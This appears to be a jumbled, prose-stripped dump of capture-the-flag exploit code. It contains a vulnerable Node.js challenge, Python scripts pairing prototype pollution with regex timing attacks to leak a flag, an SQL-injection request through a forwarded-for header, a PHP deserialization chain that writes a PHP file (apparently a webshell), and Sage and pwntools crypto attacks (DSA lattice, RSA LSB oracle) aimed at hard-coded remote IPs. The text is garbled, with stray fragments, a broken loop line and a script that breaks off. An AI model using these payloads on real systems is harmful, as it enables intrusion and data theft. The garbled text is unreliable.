app.post('/',function (req, res) {
    if(typeof req.body.user.username != "string"){
        res.end("error");
    }else {
        if(config.forbidAdmin && req.body.user.username.includes("admin")){
            res.end("any admin user has been baned");
        }else {
            if(req.body.user.username.toUpperCase() === 
adminName.toUpperCase())
                //only log admin's activity
                log(req.body.user);
            res.end("ok");
        }
    }
});
app.get('/log', function (req,res) {
    if(loginHistory.length==0){
        res.end("no log");
    }else {
        res.json(loginHistory);
    }
});
app.get('/verifyFlag', function (req, res) {
    res.render("verifyFlag");
});
app.post('/verifyFlag',function (req,res) {
    //let result = "Your match flag is here: ";
    let result = "Emm~ I won't tell you what happened! ";
    if(typeof req.body.q != "string"){
        res.end("please input your guessing flag");
    }else{
        let regExp = req.body.q;
        if(config.enableReg && noDos(regExp) && flag.match(regExp)){
            //res.end(flag);
            //Stop your wishful thinking and go away!
        }
        if(req.query.q === flag)
            result+=flag;
        res.end(result);
    }
});
function noDos(regExp) {
    //match regExp like this will be too hard
    return !(regExp.length>30||regExp.match(/[)]/g).length>5);
}
function log(userInfo){
    let logItem = {"time":new Date().toString()};
    merge(logItem,userInfo);
    loginHistory.push(logItem);
}
#!/usr/bin/python
# -*- coding: UTF-8 -
import requests, sys
from time import time,sleep
prefix = ''
depth = 2
if len(sys.argv) >= 3:
    depth = int(sys.argv[2])
    prefix = sys.argv[1]
elif len(sys.argv) >= 2:
    depth = int(sys.argv[1])
suffix = '(' * depth + '.' + '*)' * depth + '!'
testcase = ""
for i in range(32,128):
    if chr(i) in ['*','(',')','?','+','\\','[','^','.']:
        continue
    testcase+=chr(i)
r = []
session = requests.Session()
for c in testcase:
    session.post('http://121.37.167.12:82', json = {"user":
{"username":"admın888", "__proto__": {"enableReg": True}}})
    begin = time()
    result = session.post('http://121.37.167.12:82/verifyFlag', json = {
        'q': prefix + c + suffix
    })
    r.append([c, time() - begin])
    sleep(0.1)
    print(prefix + c + suffix)
    print(len(prefix + c + suffix))
    print(result.text)
r = sorted(r, key = lambda x: x[1])
for d in r[::-1][:3]:
    print('[*] {} : {}'.format(d[0], d[1]))
#!/usr/bin/python
# -*- coding: UTF-8 -
import requests, sys
from time import time,sleep
prefix = ''
depth = 2
if len(sys.argv) >= 3:
    depth = int(sys.argv[2])
    prefix = sys.argv[1]
elif len(sys.argv) >= 2:
    depth = int(sys.argv[1])
prefix2 = '(' * depth
suffix = ')*' * depth
testcase = ""
for i in range(32,128):
    if chr(i) in ['*','(',')','?','+','\\','[','^','.']:
        continue
    testcase+=chr(i)
session = requests.Session()
session.post('http://121.37.167.12:82', json = {"user":{"username":"admın888", 
"__proto__": {"enableReg": True}}})
r = []
for c in testcase:
    begin = time()
    result = session.post('http://121.37.167.12:82/verifyFlag', json = {
        'q': prefix + prefix2 + '[^{}]'.format(c) + suffix + '!'
    })
    r.append([c, time() - begin])
    sleep(0.1)
    print(prefix + prefix2 + '[^{}]'.format(c) + suffix + '!')
    print(len(prefix + prefix2 + '[^{}]'.format(c) + suffix + '!'))
    print(result.text)
r = sorted(r, key = lambda x: x[1])
g3tF1AAGaEz1Y
g3tF1AGEazYg3tF1AGEAzY
AGaEz1Yﬂagﬂag:g3tF1aAGEAzY
hardphp
 XNUCAphp
phpuserControllersession
for d in r[:15]:
    print('[*] {} : {}'.format(d[0], d[1]))
POST /?c=user&a=login HTTP/1.1
Host: 127.0.0.1:8888
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
Cookie: PHPSESSID=8ce8a0c31317274b96eb0bd9bfb212bc
Connection: close
username=asaasasas&password=123456&HTTP_X_FORWARDED_FOR[',data%3d's'%23]=123
 BaseController 
sessionsession_set_save_handlerread
 [$_SESSION]
sessionallowed_classes
Uploadwrite
waf  {
      'waf'
    }
    ($var_6)) {
      return file_put_contents($var_7,$var_6)!==None;
    }
    return False;
  }
public function save($var_23,$var_22) {
  $var_24=APP_DIR.DS.$this-> {'savePath'}.$var_22;
  $var_6=file_get_contents($var_23);
if($this-> {'write'}($var_6,$var_24)) {
  $var_27=DS.$this-> {'savePath'}.$var_22;
 save Logger
XNUCApayload
{'handle'} = new LogDriver();
    }
    public function add($var_1, $var_2 = null) {
        $this->{'err'}[time() ] = ['data' => $var_1, 'type' => $var_2];
    }
    public function __destruct() {
        if (count($this->{'err'})) {
            foreach ($this->{'err'} as $var_7 => $var_8) {
                $this->{'handle'}->{'save'}($var_7, $var_8);
            }
        }
    }
}
handle = new Upload(1,2);
        $this->err = 
['/var/www/html/img/upload/3c9pg88km5ndiva7xrm69d4rh07zezen.png'=>'nu1l666_777
.php'];  
    }
}
$_SESSION['data'] = 
urldecode('O%3A7%3A%22Session%22%3A4%3A%7Bs%3A5%3A%22%00%2A%00ip%22%3BN%3Bs%3A
12%3A%22%00%2A%00userAgent%22%3BN%3Bs%3A9%3A%22%00%2A%00userId%22%3BN%3Bs%3A12
%3A%22%00%2A%00loginTime%22%3BN%3B%7D');
$a = new Logger();
echo "\n\n";
$c = serialize($a);
$d = urlencode($c);
$e = str_replace("%00","',0x00,'",$d);
echo 'HTTP_X_FORWARDED_FOR[,data%3dconcat(\'data|'.$e.'\')%23]=123';
echo "\n\n";
?>
#!/usr/bin/env sage
    from Crypto.Util.number import long_to_bytes 
    import socket, telnetlib, hashlib, random, itertools
    #HOST, PORT = 'localhost', 9999
    HOST, PORT = '121.37.174.33', 10000
    s = socket.socket()
    s.connect((HOST, PORT))
    f = s.makefile('rw', 0)
    def recv_until(f, delim='\n'):
      buf = ''
      while not buf.endswith(delim):
        buf += f.read(1)
      return buf
    def proof_of_work(suffix, chal):
      for comb in itertools.product(range(256), repeat=3):
        m = ''.join(map(chr, comb))
        if hashlib.sha256(m + suffix).hexdigest() == chal:
          return m
      raise Exception("Not found...")
    recv_until(f, ' + ')
    suffix = recv_until(f, ')')[:-1].decode('hex')
    recv_until(f, ' == ')
    chal = recv_until(f, '\n').strip()
    m = proof_of_work(suffix, chal)
    recv_until(f, 'hex: ')
    f.write(m.encode('hex') + '\n')
    recv_until(f, 'p = ')
    p = ZZ(recv_until(f, '\n'))
    recv_until(f, 'q = ')
    q = ZZ(recv_until(f, '\n'))
    recv_until(f, 'g = ')
    g = ZZ(recv_until(f, '\n'))
    recv_until(f, 'y = ')
    y = ZZ(recv_until(f, '\n'))
    print 'Parameters received...'
    def sign(name):
      recv_until(f, '$ ')
      f.write('1\n')
      recv_until(f, 'username: ')
      f.write(name + '\n')
      recv_until(f, ' == ')
      bitlen = ZZ(recv_until(f, '\n').strip())
      recv_until(f, 'hex: ')
      sig = recv_until(f, '\n').strip().decode('hex')
      r, s = map(lambda x: ZZ(int(x.encode('hex'), 16)), 
[sig[len(name):len(name)+20], sig[len(name)+20:len(name)+40]])
      return bitlen, r, s
    def verify(sig):
      recv_until(f, '$ ')
      f.write('2\n')
      recv_until(f, 'signature: ')
      f.write(sig + '\n')
      return 
    H = lambda m: ZZ(int(hashlib.sha256(m).hexdigest(), 16))
    d = 30
    msg = 'user'
    t, u = [], []
    print 'Collecting signatures...'
lancet
LSB Oracle
    while len(t) = 120: continue
      t_i = (r0 * inverse_mod(s0, q)) % q
      u_i = (2 ^ (bl + 1) - H(msg) * inverse_mod(s0, q)) % q
      t.append(t_i)
      u.append(u_i)
      print "Collected: %d / %d" % (len(t), d)
    def solve_hnp(p, k, d, t, u):
      M = Matrix(QQ, d + 1, d + 1)
      for i in xrange(d):
        M[i, i] = p
        M[d, i] = t[i]
      M[d, d] = 1 / (2 ** (k + 1))
      def babai(A, w):
        A = A.LLL(delta=0.75)
        G = A.gram_schmidt()[0]
        t = w
        for i in reversed(range(A.nrows())):
          c = ((t * G[i]) / (G[i] * G[i])).round()
          t -= A[i] * c
        return w - t
      closest = babai(M, vector(u + [0]))
      return (closest[-1] * (2 ** (k + 1))) % p
    x = solve_hnp(q, 8, d, t, u)
    def dsa_sign(m, x, q, p, g):
      h = H(m)
      k = random.randint(1, q - 1)
      r = ZZ(pow(g, k, p)) % q
      s = ZZ((inverse_mod(k, q) * (h + x * r)) % q)
      return m.encode('hex') + r.hex().rjust(40, '0') + s.hex().rjust(40, '0')
    sig = dsa_sign('admin', x, q, p, g)
    verify(sig)
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
from pwn import *
import gmpy2, base64
from Crypto.Util.number import bytes_to_long, long_to_bytes
p = remote('121.37.174.33', 9999)
p.recvuntil('Welcome to RSA WORLD !!!')
p.recvuntil('n:')
n = int(p.recvline().strip())
p.recvuntil('e:')
e = int(p.recvline().strip())
p.recvuntil('flag:')
flag = int(p.recvline().strip())
log.info(hex(n))
log.info(hex(e))
log.info(hex(flag))
def encrypt(m):
  p.recvuntil('you can choose what you want here\n')
  p.sendline('1')
  p.recvuntil('send how long you want to encrypt\n')
  p.sendline(str(len(base64.b64encode(m))))
  p.recvuntil('send the message in base64 encode\n')
  p.sendline(base64.b64encode(m))
  p.recvuntil('res:')
  res = int(p.recvline().strip().decode('base64'))
  return res
def decrypt(c):
  p.recvuntil('you can choose what you want here\n')
  p.sendline('2')
  p.recvuntil('send how long you want to decrypt\n')
  print len(c), len(base64.b64encode(c))
  if (len(base64.b64encode(c)) >= 100):
    p.send(str(len(base64.b64encode(c))))
  else:
    p.sendline(str(len(base64.b64encode(c))))
  p.recvuntil('send the message in base64 encode\n')
  p.sendline(base64.b64encode(c))
  p.recvuntil('res:')
  res = int(p.recvline().strip())
  #res = int(p.recvline().strip().decode('base64'))
  return res
upper_limit = n / (2 ** 1024)
lower_limit = 0